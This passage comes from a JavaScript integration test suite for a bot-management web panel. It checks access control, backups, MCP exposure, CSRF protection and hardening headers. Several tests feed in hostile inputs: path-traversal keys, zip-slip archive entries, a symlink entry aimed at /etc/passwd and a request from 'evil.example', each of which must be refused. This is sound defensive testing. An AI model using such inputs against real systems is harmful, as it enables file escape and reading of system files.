  assert.deepStrictEqual(bots.map(b => b.name), ['alphabot'], 'only allowed bots are listed');

  assert.strictEqual((await api('GET', '/api/bots/alphabot', { token: restrictedToken })).status, 200);
  assert.strictEqual((await api('GET', '/api/files/alphabot/tree', { token: restrictedToken })).status, 200);
  assert.strictEqual((await api('GET', '/api/bots/otherbot', { token: restrictedToken })).status, 403);
  assert.strictEqual((await api('GET', '/api/files/otherbot/tree', { token: restrictedToken })).status, 403);

  for (const [method, endpoint] of [
    ['GET', '/api/system/info'],
    ['GET', '/api/users'],
    ['GET', '/api/backups'],
    ['POST', '/api/bots']
  ]) {
    const res = await api(method, endpoint, { token: restrictedToken });
    assert.strictEqual(res.status, 403, `${method} ${endpoint} must be admin-only`);
  }

  assert.strictEqual((await api('GET', '/api/update/version', { token: restrictedToken })).status, 200,
    'the version chip is visible to every signed-in account');
  assert.strictEqual((await api('GET', '/api/update/status', { token: restrictedToken })).status, 403,
    'update status remains admin-only');

  const notes = await api('PATCH', '/api/bots/alphabot', {
    token: restrictedToken,
    body: { notes: 'edited by a restricted user' }
  });
  assert.strictEqual(notes.status, 200, 'an allowed user may edit bot notes');

  const mcp = await api('PATCH', '/api/bots/alphabot', {
    token: restrictedToken,
    body: { mcp_exposed: true }
  });
  assert.strictEqual(mcp.status, 403, 'MCP exposure stays admin-only');
});

test('USERS: permission changes apply to the next request', async () => {
  const updated = await api('PATCH', `/api/users/${restrictedUserId}`, {
    token: adminToken,
    body: { allowed_bots: [] }
  });
  assert.strictEqual(updated.status, 200);
  assert.deepStrictEqual((await updated.json()).allowed_bots, []);

  const list = await api('GET', '/api/bots', { token: restrictedToken });
  assert.deepStrictEqual(await list.json(), [], 'the filtered list is empty');
  assert.strictEqual((await api('GET', '/api/bots/alphabot', { token: restrictedToken })).status, 403);

  const restored = await api('PATCH', `/api/users/${restrictedUserId}`, {
    token: adminToken,
    body: { allowed_bots: ['alphabot'] }
  });
  assert.strictEqual(restored.status, 200);
  assert.strictEqual((await api('GET', '/api/bots/alphabot', { token: restrictedToken })).status, 200);
});

test('USERS: resetting the password and deleting the account revoke access', async () => {
  const reset = await api('POST', `/api/users/${restrictedUserId}/password`, {
    token: adminToken,
    body: { password: 'AnotherStr0ngPass' }
  });
  assert.strictEqual(reset.status, 200);
  assert.strictEqual((await api('GET', '/api/auth/me', { token: restrictedToken })).status, 401,
    'a password reset disconnects every existing session');

  const relogin = await api('POST', '/api/auth/login', {
    body: { username: 'restricted', password: 'AnotherStr0ngPass' }
  });
  assert.strictEqual(relogin.status, 200);
  restrictedToken = (await relogin.json()).token;

  const removed = await api('DELETE', `/api/users/${restrictedUserId}`, { token: adminToken });
  assert.strictEqual(removed.status, 200);
  assert.strictEqual((await api('GET', '/api/auth/me', { token: restrictedToken })).status, 401);
});

test('USERS: the last administrator cannot be deleted or demoted', async () => {
  const remove = await api('DELETE', `/api/users/${adminUserId}`, { token: adminToken });
  assert.strictEqual(remove.status, 400, 'an admin cannot delete its own account');
  const demote = await api('PATCH', `/api/users/${adminUserId}`, {
    token: adminToken,
    body: { role: 'user' }
  });
  assert.strictEqual(demote.status, 400, 'the last admin cannot be demoted');
});

test('BOTS: environment variables can be read and replaced', async () => {
  const before = await api('GET', '/api/bots/alphabot/env', { token: adminToken });
  assert.strictEqual(before.status, 200);
  const beforeBody = await before.json();
  assert.ok(Array.isArray(beforeBody.vars));
  assert.ok(beforeBody.vars.some(v => v.key === 'TOKEN'));

  const put = await api('PUT', '/api/bots/alphabot/env', {
    token: adminToken,
    body: { vars: [{ key: 'TOKEN', value: 'new-test-token-1234567890' }, { key: 'PREFIX', value: '!' }] }
  });
  assert.strictEqual(put.status, 200, await put.clone().text());

  const after = await api('GET', '/api/bots/alphabot/env', { token: adminToken });
  const afterBody = await after.json();
  assert.ok(afterBody.vars.some(v => v.key === 'PREFIX' && v.value === '!'));

  const bad = await api('PUT', '/api/bots/alphabot/env', {
    token: adminToken,
    body: { vars: [{ key: '../../TOKEN', value: 'x' }] }
  });
  assert.strictEqual(bad.status, 400);
});

// -------------------------------------------------------------
// System
// -------------------------------------------------------------
test('SYSTEM: info, activity and settings endpoints all answer', async () => {
  const info = await api('GET', '/api/system/info', { token: adminToken });
  assert.strictEqual(info.status, 200, await info.clone().text());

  const act = await api('GET', '/api/system/activity', { token: adminToken });
  assert.strictEqual(act.status, 200);
  const log = await act.json();
  assert.ok(Array.isArray(log));
  assert.ok(log.length > 0, 'the activity log records what just happened');

  const set = await api('GET', '/api/system/settings', { token: adminToken });
  assert.strictEqual(set.status, 200);
  const settings = await set.json();
  assert.strictEqual(settings.instance_name, 'Test Instance');
});

test('SYSTEM: settings can be updated and bad values are rejected', async () => {
  const ok = await api('PATCH', '/api/system/settings', {
    token: adminToken, body: { instance_name: 'Renamed Instance', bot_max_restarts: 7 }
  });
  assert.strictEqual(ok.status, 200);
  const settings = await ok.json();
  assert.strictEqual(settings.instance_name, 'Renamed Instance');
  assert.strictEqual(settings.bot_max_restarts, 7);

  const bad = await api('PATCH', '/api/system/settings', {
    token: adminToken, body: { language: 'klingon' }
  });
  assert.strictEqual(bad.status, 400);

  const badNum = await api('PATCH', '/api/system/settings', {
    token: adminToken, body: { bot_max_restarts: 'lots' }
  });
  assert.strictEqual(badNum.status, 400);
});

test('MCP: endpoint is opt-in, token-protected and lists only exposed bots', async () => {
  const mcpUrl = `http://127.0.0.1:${ctx.port}/mcp`;
  const listBody = JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/list' });
  const disabled = await fetch(mcpUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Accept: 'application/json, text/event-stream' },
    body: listBody
  });
  assert.strictEqual(disabled.status, 404, 'MCP is disabled by default');

  const enabled = await api('PATCH', '/api/system/settings', {
    token: adminToken, body: { mcp_enabled: true }
  });
  assert.strictEqual(enabled.status, 200);
  const settings = await enabled.json();
  assert.ok(settings.mcp_token, 'enabling MCP generates a bearer token');
  const auth = { Authorization: `Bearer ${settings.mcp_token}` };

  const noauth = await fetch(mcpUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Accept: 'application/json, text/event-stream' },
    body: listBody
  });
  assert.strictEqual(noauth.status, 401);

  const expose = await api('PATCH', '/api/bots/alphabot', {
    token: adminToken, body: { mcp_exposed: true }
  });
  assert.strictEqual(expose.status, 200);

  const tools = await fetch(mcpUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Accept: 'application/json, text/event-stream', ...auth },
    body: listBody
  });
  assert.strictEqual(tools.status, 200);
  const toolsText = await tools.text();
  assert.match(toolsText, /"create_bot"/);
  assert.match(toolsText, /"get_bot_logs"/);

  const call = await fetch(mcpUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Accept: 'application/json, text/event-stream', ...auth },
    body: JSON.stringify({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'list_bots', arguments: {} } })
  });
  const callText = await call.text();
  const dataLine = callText.split('\n').find(l => l.startsWith('data: '));
  assert.ok(dataLine, 'MCP answers with an SSE data event');
  const payload = JSON.parse(dataLine.slice(6));
  const listed = JSON.parse(payload.result.content[0].text);
  assert.ok(listed.bots.some(b => b.name === 'alphabot' && b.mcpExposed === true));
  assert.ok(listed.bots.every(b => b.mcpExposed === true), 'hidden bots are not listed');
});

test('SYSTEM: templates are listed and can be fetched individually', async () => {
  const list = await api('GET', '/api/system/templates?lang=fr', { token: adminToken });
  assert.strictEqual(list.status, 200);
  const body = await list.json();
  assert.ok(Array.isArray(body.templates) && body.templates.length > 0, 'the template library is populated');

  const one = await api('GET', `/api/system/templates/${body.templates[0].id}`, { token: adminToken });
  assert.strictEqual(one.status, 200);

  const missing = await api('GET', '/api/system/templates/nope-nope', { token: adminToken });
  assert.strictEqual(missing.status, 404);
});

// -------------------------------------------------------------
// Backups
// -------------------------------------------------------------
test('BACKUPS: export produces a real zip', async () => {
  const res = await fetch(`http://127.0.0.1:${ctx.port}/api/backups/alphabot/export`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${adminToken}` }
  });
  assert.strictEqual(res.status, 200);
  assert.ok((res.headers.get('content-type') || '').includes('zip'));
  const buf = Buffer.from(await res.arrayBuffer());
  assert.strictEqual(buf.readUInt32LE(0), 0x04034b50, 'PK zip magic');
  assert.ok(buf.length > 0);

  const list = await api('GET', '/api/backups', { token: adminToken });
  assert.strictEqual(list.status, 200);
  assert.ok((await list.json()).length > 0, 'the export is recorded in the backup list');
});

test('BACKUPS: importing a well-formed archive creates the bot', async () => {
  const zip = makeZip([
    { name: 'importedbot/index.js', data: '// imported bot\n' },
    { name: 'importedbot/package.json', data: JSON.stringify({ name: 'importedbot', main: 'index.js' }) }
  ]);
  const form = new FormData();
  form.append('archive', new Blob([zip], { type: 'application/zip' }), 'bot.zip');
  const res = await fetch(`http://127.0.0.1:${ctx.port}/api/backups/import`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${adminToken}` },
    body: form
  });
  assert.strictEqual(res.status, 200, `import failed: ${await res.clone().text()}`);
  assert.ok(fs.existsSync(path.join(SB.botsRoot, 'importedbot', 'index.js')));
});

test('UPD-06: an archive with a path-traversal entry is refused', async () => {
  const zip = makeZip([
    { name: 'evilbot/index.js', data: 'x' },
    { name: 'evilbot/../../escaped.txt', data: 'escaped' }
  ]);
  const form = new FormData();
  form.append('archive', new Blob([zip], { type: 'application/zip' }), 'evil.zip');
  const res = await fetch(`http://127.0.0.1:${ctx.port}/api/backups/import`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${adminToken}` },
    body: form
  });
  assert.ok(res.status >= 400, `zip-slip must be refused, got ${res.status}`);
  assert.ok(!fs.existsSync(path.join(SB.botsRoot, 'escaped.txt')), 'nothing may escape the temp dir');
});

test('UPD-06: an archive with a symlink entry is refused', async () => {
  // Unix S_IFLNK in the high 16 bits of externalFileAttributes.
  const zip = makeZip([
    { name: 'evilbot/index.js', data: 'x' },
    {
      name: 'evilbot/leak',
      data: '/etc/passwd',
      externalAttributes: 0xA1FF0000,
      versionMadeBy: 0x031E
    }
  ]);
  const form = new FormData();
  form.append('archive', new Blob([zip], { type: 'application/zip' }), 'evil-symlink.zip');
  const res = await fetch(`http://127.0.0.1:${ctx.port}/api/backups/import`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${adminToken}` },
    body: form
  });
  assert.ok(res.status >= 400, `symlink zip entry must be refused, got ${res.status}`);
  assert.ok(!fs.existsSync(path.join(SB.botsRoot, 'evilbot', 'leak')),
    'no symlink may be extracted from the archive');
});

// -------------------------------------------------------------
// Update
// -------------------------------------------------------------
test('UPDATE: the version and status endpoints answer', async () => {
  const v = await api('GET', '/api/update/version', { token: adminToken });
  assert.strictEqual(v.status, 200);
  assert.ok((await v.json()).version, 'the local version is reported');

  const s = await api('GET', '/api/update/status', { token: adminToken });
  assert.strictEqual(s.status, 200);
  const status = await s.json();
  assert.ok(status.local, 'the status payload still has the shape the UI expects');
  assert.ok('steps' in status === false || Array.isArray(status.steps));
});

test('UPDATE: /perform refuses a payload and is admin-gated', async () => {
  const withBody = await api('POST', '/api/update/perform', { token: adminToken, body: { x: 1 } });
  assert.strictEqual(withBody.status, 400);

  const noAuth = await api('POST', '/api/update/perform');
  assert.strictEqual(noAuth.status, 401);
});

// -------------------------------------------------------------
// CSRF / CORS
// -------------------------------------------------------------
test('UPD-12: a cross-origin state-changing request is refused', async () => {
  const res = await api('PATCH', '/api/system/settings', {
    token: adminToken,
    body: { instance_name: 'hijacked' },
    headers: { Origin: 'https://evil.example' }
  });
  assert.strictEqual(res.status, 403, 'a foreign Origin must not be able to drive the API');

  const settings = await api('GET', '/api/system/settings', { token: adminToken });
  assert.notStrictEqual((await settings.json()).instance_name, 'hijacked');
});

test('UPD-12: a same-origin request with an Origin header is allowed', async () => {
  const res = await api('PATCH', '/api/system/settings', {
    token: adminToken,
    body: { instance_name: 'Same Origin OK' },
    headers: { Origin: `http://127.0.0.1:${ctx.port}` }
  });
  assert.strictEqual(res.status, 200);
});

test('UPD-12: a request with no Origin header (curl, scripts) is allowed', async () => {
  const res = await api('PATCH', '/api/system/settings', {
    token: adminToken, body: { instance_name: 'No Origin OK' }
  });
  assert.strictEqual(res.status, 200);
});

// -------------------------------------------------------------
// Static frontend
// -------------------------------------------------------------
test('FRONTEND: the SPA and its assets are served', async () => {
  const page = await fetch(`http://127.0.0.1:${ctx.port}/`);
  assert.strictEqual(page.status, 200);
  const html = await page.text();
  assert.ok(html.includes('js/app.js'), 'app.js referenced');
  assert.ok(html.includes('js/editor.js'), 'editor.js referenced');
  assert.ok(html.includes('translations/fr.js'), 'translations referenced');

  for (const asset of ['/js/app.js', '/js/api.js', '/js/editor.js', '/js/i18n.js', '/css/style.css', '/translations/en.js']) {
    const res = await fetch(`http://127.0.0.1:${ctx.port}${asset}`);
    assert.strictEqual(res.status, 200, `${asset} must be served`);
  }
});

test('FRONTEND: the setup wizard markup and the esc() fix are present', async () => {
  const app = await (await fetch(`http://127.0.0.1:${ctx.port}/js/app.js`)).text();
  assert.ok(app.includes('id="setup-token"'), 'the bootstrap token field exists in the wizard');
  assert.ok(app.includes("'&#39;'"), 'esc() escapes the apostrophe');
  assert.ok(app.includes("NexusAPI.auth.logout"), 'logout revokes server-side');
});

test('RESPONSE HEADERS: the hardening headers are actually sent', async () => {
  const res = await fetch(`http://127.0.0.1:${ctx.port}/api/health`);
  assert.strictEqual(res.headers.get('x-content-type-options'), 'nosniff');
  assert.strictEqual(res.headers.get('x-frame-options'), 'SAMEORIGIN');
  assert.strictEqual(res.headers.get('x-xss-protection'), '0');
  assert.strictEqual(res.headers.get('referrer-policy'), 'no-referrer');
  assert.ok(res.headers.get('content-security-policy'), 'CSP present');
  assert.strictEqual(res.headers.get('x-powered-by'), null);
});

test.after(() => SB.cleanup());
